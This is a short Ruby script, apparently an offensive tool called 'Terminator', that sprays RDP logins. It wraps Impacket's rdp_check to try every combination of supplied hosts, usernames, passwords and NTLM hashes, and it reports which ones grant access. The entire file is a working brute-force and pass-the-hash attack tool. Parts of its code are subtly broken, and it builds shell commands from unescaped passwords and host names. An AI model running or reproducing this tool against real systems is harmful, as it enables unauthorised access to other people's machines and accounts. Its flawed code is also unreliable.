#!/usr/bin/env ruby
#Terminator is an RDP attack tool which wraps Impackets rdp_check.
#HASHES:
require 'optimist'
require 'colorize'
require 'logger'
require 'tty-command'

@tooldir    = File.expand_path(File.dirname(__FILE__))
@rdp_check  = "#{@tooldir}/rdp_check.py"

def arguments
  @opts = Optimist::options do
    version "terminator 0.1".light_blue
    banner <<-EOS
    RDP Password Attacker
    EOS

    opt :host,   "Provide a single host at the command line - host:port", :type => String, :short => "-h"
    opt :hosts,  "Provide a list of hosts", :type => String, :short => "-H"
    opt :user,   "Provide a username",  :type => String, :short => "-u"
    opt :users,  "Provide a list of usernames",  :type => String, :short => "-U"
    opt :pass,   "Provide a password",  :type => String, :short => "-p"
    opt :passes, "Provide a list of passwords",  :type => String, :short => "-P"
    opt :hash,   "Provide a hash instead of a password", :type => String, :short => "-n"
    opt :hashes, "Provide a list of hashes instead of a password", :type => String, :short => "-N"
    opt :domain, "Domain or workgroup", :short => "-d",  :default => "WORKGROUP"

    if ARGV.empty?
      puts "Try ./terminator.rb --help"
    end
  end
  @opts
end

def hostlist
  if @opts[:hosts]
    hosts = File.readlines(@opts[:hosts]).map(&:chomp &&:strip)
  else
    hosts = [@opts[:host].to_s]
  end
end

def userlist
  if @opts[:users]
    users = File.readlines(@opts[:users]).map(&:chomp &&:strip)
  else
    users = [@opts[:user].to_s]
  end
end

def passlist
  if @opts[:passes]
    passwords = File.readlines(@opts[:passes]).map(&:chomp &&:strip)
  else
    passwords = [@opts[:pass].to_s]
  end
end

def hashlist
  if @opts[:hashes]
    passwords = File.readlines(@opts[:hashes]).map(&:chomp &&:strip)
  else
    passwords = [@opts[:hash].to_s]
  end
end

def creds_combo
  final_creds = []
  userlist.each do |user|
    passlist.each do |pass|
      hashlist.each do |hash|
        final_creds << [user, pass, hash]

      end
    end
  end
  final_creds.each {|a| a.reject!(&:empty?)}
end

def tty_command(command, timeout)
  @command = command
  log      = Logger.new('debug.log')
  cmd      = TTY::Command.new(output: log, timeout: timeout)
  result   = cmd.run!(command)
  @out     = result.out
  @err     = result.err
  rescue TTY::Command::TimeoutExceeded => @timeout_error
  puts "Timeout: #{@command}".red.bold if @timeout_error
end

def run_command
  hostlist.each do |host|
    creds_combo.each do |creds|
      if @opts[:hash] or @opts[:hashes]
        command = "#{@rdp_check} -hashes=#{creds[1]} #{@opts[:domain]}/#{creds[0]}:@#{host}"
      else
        command = "#{@rdp_check} #{@opts[:domain]}/#{creds[0]}:'#{creds[1]}'@#{host}"
      end
      tty_command(command, 10)
      if @out =~ /Access Granted/
        puts "ACCESS GRANTED: #{host}:#{creds[0]}:#{creds[1]} ".green.bold
      elsif @err
        puts "Error: #{host}:#{creds[0]}:#{creds[1]}\n#{@err}".red.bold
      else
        puts "NOPE #{host}:#{creds[0]}:#{creds[1]}".red.bold
      end
    end
  end
end


arguments
run_command
